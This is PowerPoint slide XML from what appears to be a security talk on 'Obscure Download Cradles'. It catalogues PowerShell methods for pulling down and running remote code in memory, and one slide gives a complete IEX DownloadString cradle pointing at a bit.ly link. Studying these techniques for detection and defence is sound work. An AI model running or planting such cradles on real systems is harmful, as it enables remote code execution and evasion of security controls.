              <a:lumMod val="85000"/>
            </a:schemeClr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200" dirty="0" smtClean="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>='http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>wc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>=(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>IEX $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>wc.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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539488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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>/MsXml2.ServerXmlHttp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200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="6634282" y="2441418"/>
            <a:ext cx="297828" cy="632834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Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16897524">
            <a:off x="6337512" y="2693917"/>
            <a:ext cx="297828" cy="1142160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8544" y="3166936"/>
            <a:ext cx="4375256" cy="744446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2522" y="2108113"/>
            <a:ext cx="4789710" cy="776335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5159165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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>/MsXml2.ServerXmlHttp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200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16897524">
            <a:off x="5929148" y="3137249"/>
            <a:ext cx="333703" cy="1856327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Up Arrow 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="15333223">
            <a:off x="5977097" y="2361844"/>
            <a:ext cx="340238" cy="1879335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6978542" y="3900846"/>
            <a:ext cx="2913601" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>IRM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000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6978542" y="2377234"/>
            <a:ext cx="3841856" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).Content</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>IWR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t> WGET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t> CURL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/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47657" y="3801884"/>
            <a:ext cx="772741" cy="92057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0084031" y="3936821"/>
            <a:ext cx="73636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 smtClean="0"/>
              <a:t>CLM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/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7429" y="2560312"/>
            <a:ext cx="772741" cy="92057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1003803" y="2695249"/>
            <a:ext cx="73636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 smtClean="0"/>
              <a:t>CLM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18602685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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Up Arrow 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="6258569" y="3522277"/>
            <a:ext cx="333289" cy="1429872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6998151" y="3293408"/>
            <a:ext cx="4091241" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>IO.StreamReader</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>]::Create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
